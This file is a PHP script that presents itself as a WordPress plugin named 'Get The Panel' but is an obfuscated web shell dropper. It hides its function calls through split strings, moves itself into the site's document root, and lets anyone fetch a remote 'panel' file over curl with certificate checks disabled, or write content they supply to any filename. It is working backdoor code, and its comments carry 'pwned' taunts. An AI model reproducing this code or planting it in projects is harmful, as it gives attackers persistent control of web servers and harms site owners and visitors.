<?php
/*
 * Plu gin Na me: G et T he Pa nel
 * S he ll v er si on
 * Ve r si on: 1.0.3b
 * Au tho r: V i n h j a x t
 * L ic en se: M I T
 * U sa ge: /get-t he-p an el.ph p?_v nn_f il e_=h tt p://your-url-to-p a nel/&_v nn_n am e_=fi le-man ager.ph p
 * U sa ge: /get-t he-pa ne l.ph p?_vn n_d ata_=[your-f ile-co ntent]&_v nn_n ame_=fi le-m ana ger.p hp
*/

# D et ec t: in  w  o r d   p r e  s s?
$_POST['cst']='con'.'sta'.'nt';
$_POST['fexs']='fun'.'ctio'.'n_exi'.'sts';
$_POST['fned']='defi'.'ned';
$_POST['rlpth']='re'.'al'.'pa'.'th';
$_POST['dinn']='d'.'ir'.'na'.'me';
$_POST['unl']='un'.'li'.'nk';
$_POST['fptc']='fi'.'le_pu'.'t_cont'.'ents';
$_POST['fgtc']='fi'.'le_get'.'_cont'.'ents';
$_POST['culit']='cu'.'rl_'.'in'.'it';
$_POST['culet']='cu'.'rl_'.'set'.'opt';
$_POST['culec']='cu'.'rl_'.'ex'.'ec';
$_POST['culc']='cu'.'rl_'.'clo'.'se';
$_POST['fpn']='fo'.'pen';
$_POST['fw']='fwr'.'ite';
$_POST['fc']='fcl'.'ose';
$_POST['fs']='file'.'size';
$_POST['sv']='_SER'.'VER';
$_POST['dr']='DOCUM'.'ENT_RO'.'OT';
$_POST['sf']='SC'.'RIPT'.'_FIL'.'EN'.'AME';
$_POST['ps']='PH'.'P_'.'SE'.'LF';
$_POST['f']=__FILE__;
$_POST['cu']=$_POST['cst']('CU'.'RL'.'OPT_U'.'RL');
$_POST['cr']=$_POST['cst']('CU'.'RLO'.'PT_RE'.'TUR'.'NTRAN'.'SFER');
$_POST['cf']=$_POST['cst']('CU'.'RLO'.'PT_FI'.'LE');
$_POST['csv']=$_POST['cst']('CU'.'RLO'.'PT_SS'.'L_VER'.'IFYH'.'OST');
$_POST['cvcp']=$_POST['cst']('CU'.'RLO'.'PT_SS'.'L_VER'.'IFYP'.'EER');
$_POST['cua']=$_POST['cst']('CU'.'RLOP'.'T_US'.'ERAG'.'ENT');
$_POST['vpi']='wp_ins'.'ert_p'.'ost';
$_POST['ipe']='i'.'s_wp'.'_er'.'ror';
$_POST['vph']='W'.'P_'.'HO'.'ME';
if($_POST['fexs']($_POST['vpi']) || $_POST['fned']($_POST['vph']) || $_POST['fexs']($_POST['ipe']) || $_POST['fexs']('add_action')){

	# Get doc u m e n t r o  o t
	if(isset($$_POST['sv'][$_POST['dr']]) && !empty($$_POST['sv'][$_POST['dr']]))
		$root=$$_POST['sv'][$_POST['dr']];
	else if(isset($$_POST['sv'][$_POST['sf']]) && !empty($$_POST['sv'][$_POST['sf']]))
		$root=$$_POST['sv'][$_POST['sf']];
	else
		$root=$_POST['rlpth']($_POST['dinn']($_POST['f']));
	$posi=strrpos($root, $$_POST['sv'][$_POST['ps']]);
	if($posi===false) $root=$root; else $root=substr($root, 0, $posi);
	unset($posi);

	# Mo v e th i s f il e  t o d ocu me nt  r oo t
	$get=$root.'/get-th'.'e-pan'.'el.php';
	if(is_file($get)) $_POST['unl']($get);
	$_POST['fptc']($get,$_POST['fgtc']($_POST['f']));
	$_POST['unl']($_POST['f']);

	# R ed i re ct  to   t h i s  f il e
	while(@ob_end_clean());
	@header('Loca'.'tion: /get-the-p'.'an'.'el.php',true,302);
	echo '<meta http-eq'.'uiv="re'.'fresh" con'.'tent="0;UR'.'L=/get-t'.'he-pa'.'nel.php" /><scr'.'ipt ty'.'pe="te'.'xt/ja'.'va'.'scr'.'ipt">loca'.'tion.h'.'re'.'f="/get-the-pa'.'nel.p'.'hp";</scr'.'ipt>';
	@(he.he.pow.ned.by.vi.nh.ja.xt());
}

# Out of w or dp re s s
@error_reporting(0);

# for the us a ge: /get-t he-pan el.php?_vnn_fi le_=htt p://your-ur l-to-pan el/&_vnn_na me_=fi le-ma nag e r.php
if(isset($_GET['_v'.'nn_f'.'il'.'e_'])){
	function _get_vnn_file_(){
		if($_POST['fned']('__DIR__')){
			$dir=__DIR__;
		}else if($_POST['fned']($_POST['f'])){
			$dir=$_POST['dinn']($_POST['f']);
		}else{
			$dir='.';
		}
		$dir.='/';
		$panel=$dir.(isset($_GET['_vnn_name_']) ? $_GET['_vnn_na'.'me_'] : '/pan'.'el.php');
		if(is_file($panel)) $_POST['unl']($panel);
		$failed=true;
		if($failed && $_POST['fexs']($_POST['culit'])){
			$fp=$_POST['fpn']($panel,'w');
			$ch=$_POST['culit']();
			$_POST['culet']($ch,$_POST['cu'],$_GET['_vnn_fi'.'le_']);
			$_POST['culet']($ch,$_POST['cua'],@$$_POST['sv']['HT'.'TP_US'.'ER_AG'.'ENT']);
			$_POST['culet']($ch,$_POST['cr'],1);
			$_POST['culet']($ch,$_POST['cvcp'],0);
			$_POST['culet']($ch,$_POST['csv'],0);
			$_POST['culet']($ch,$_POST['cf'],$fp);
			$data=$_POST['culec']($ch);
			$_POST['culc']($ch);
			$_POST['fc']($fp);
			unset($ch);
			unset($fp);
			if($_POST['fs']($panel)==0) $_POST['fptc']($panel,$data);
			$failed=($_POST['fs']($panel)==0);
		}
		if($failed && $_POST['fexs']($_POST['fgtc'])){
			$_POST['fptc']($panel,$_POST['fgtc']($_GET['_v'.'nn_fi'.'le_']));
			$failed=($_POST['fs']($panel)==0);
		}
		if($_POST['fs']($panel)==0){
			echo ('O'.'h m'.'en!');
			@(he.he.pow.ned.by.vi.nh.ja.xt());
		}else{
			echo ('O'.'K m'.'en!');
			@(he.he.pow.ned.by.vi.nh.ja.xt());
		}
	} # end of function _ge t_vn n_fi le _

	# serve the request
	_get_vnn_file_();
} # end of if _vnn_f i le_


# for the usage: /get-t he-pa nel.p hp?_v nn_da ta_=[y our-f ile-co nte nt]&_v nn_na me_=f il e-ma nag er.php
if(isset($_REQUEST['_vn'.'n_da'.'ta_'])){

	# function get co nt en t and put it into a f il e
	function _get_vnn_data_(){
		if($_POST['fned']('__DIR__')){
			$dir=__DIR__;
		}else if($_POST['fned']($_POST['f'])){
			$dir=$_POST['dinn']($_POST['f']);
		}else{
			$dir='.';
		}
		$dir.='/';
		$panel=$dir.(isset($_GET['_vn'.'n_na'.'me_']) ? $_GET['_vn'.'n_n'.'ame_'] : '/pan'.'el.php');
		if(is_file($panel)) $_POST['unl']($panel);
		$failed=true;
		$data=isset($_POST['_vn'.'n_da'.'ta_'])?$_POST['_v'.'nn_d'.'ata_']:$_GET['_vn'.'n_da'.'ta_'];
		if($failed && $_POST['fexs']($_POST['fptc'])){
			$_POST['fptc']($panel,$data);
			$failed=($_POST['fs']($panel)==0);
		}
		if($failed && $_POST['fexs']($_POST['fpn'])){
			$fp=$_POST['fpn']($panel,'w');
			$_POST['fw']($fp,$data);
			$_POST['fc']($fp);
			$failed=($_POST['fs']($panel)==0);
		}
		if($failed){
			echo ('O'.'h m'.'en!');
			@(he.he.pow.ned.by.vi.nh.ja.xt());
		}else{
			echo ('O'.'K m'.'en!');
			@(he.he.pow.ned.by.vi.nh.ja.xt());
		}
	} # end of function _get_vn n_da ta_

	# call this function to serve the request
	_get_vnn_data_();
} # end of if _vn n_da ta_
?>